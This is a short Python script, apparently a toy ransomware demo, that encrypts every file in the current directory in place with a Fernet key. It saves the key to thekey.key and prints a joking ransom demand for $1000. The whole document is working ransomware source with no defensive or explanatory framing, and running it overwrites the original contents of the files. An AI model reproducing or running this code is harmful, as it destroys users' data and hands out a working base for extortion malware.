#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
	if file == 'encrypt.py' or file == 'decrypt.py' or file == 'thekey.key':
		continue
	if os.path.isfile(file):
		files.append(file)

key = Fernet.generate_key()

with open("thekey.key","wb") as key_file:
	key_file.write(key)

for file in files:
	with open(file,"rb") as the_file:
		contents = the_file.read()
	encrypted_contents = Fernet(key).encrypt(contents)
	with open(file,"wb") as the_file:
		the_file.write(encrypted_contents)

print("RANSOM! Your files are now encryted, send me 1000$ or buy me a coffee to get the secret message")
